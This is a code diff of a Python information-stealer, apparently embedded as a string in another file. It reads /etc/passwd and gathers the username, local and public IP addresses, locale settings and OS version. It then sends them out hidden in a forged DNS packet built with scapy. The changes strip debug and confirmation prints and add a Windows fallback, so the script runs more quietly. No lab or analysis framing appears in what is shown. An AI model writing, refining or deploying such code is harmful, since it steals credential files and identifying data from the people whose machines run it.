@@ -12,56 +12,43 @@ from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 from scapy.layers.dns import DNS
 from scapy.layers.dns import DNSRR, DNSQR
+from requests import get
+import sys
         
 if __name__ == "__main__":        
     #geting info from user:
 
-    # print(os.name) #posix for linux ot nt for windows
     if (os.name == "posix"): # linux
         with open("/etc/passwd", "rb") as f:
             pass_file = f.read()
         available_languages = locale.locale_alias.keys()
-        #for locale_name in available_languages:
-        #   print(locale_name)
         user_language, _ = locale.getdefaultlocale()
-        # print(user_language)
         version = os.uname().nodename
-        #print("Version:", version)
     else: # windows
         #with open("C:\\Windows\\System32\\config", "rb") as f: #  Permission denied: 'C:\\Windows\\System32\\config'
         #    pass_file = f.read()
+        pass_file = " "
         available_languages = locale.windows_locale.values()
-        #for language in available_languages:
-        #    print(language)
         user_language, _ = locale.getdefaultlocale()
-        #print(user_language)
-        version = platform.platform()
-        #print(version)
+        version = sys.getwindowsversion().platform_version
+        version = '.'.join(map(str, sys.getwindowsversion().platform_version))
 
 
-    #print(pass_file) #- work in linux doset work on windows!!!
-    username = os.getlogin() 
-    # print(os.getlogin()) # works in linux and windows
+    username = os.getlogin() # works in linux and windows
 
     # works in linux and windows
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.connect(("8.8.8.8", 80))
     inside_ip = sock.getsockname()[0]
     sock.close()
-    #print(inside_ip) 
 
     # works in linux and windows
-    ip_service = "https://api.ipify.org"  # External service to get the IP
-    response = urllib.request.urlopen(ip_service)
-    outside_ip = response.read().decode()
-    #print(outside_ip)
+    outside_ip = get("https://api.ipify.org").text
 
 
     #dns sending
 
     message = "passwords: " + str(pass_file) + "\\nusername: " +  username + "\\nlocal IP: " + inside_ip + "\\noutside IP: " + outside_ip + "\\navailable_languages: " + str(available_languages) + "\\nuser language: " + user_language + "\\nOS version: " + version
-
-
 
     # Create DNS layer
     dns_layer = DNS(
@@ -92,7 +79,6 @@ if __name__ == "__main__":
     packet = ip_layer / udp_layer / dns_layer / dnsrr_layer / message
 
     # Send the packet
-    send(packet)
-    print("send!")""")
+    send(packet)""")
 
 
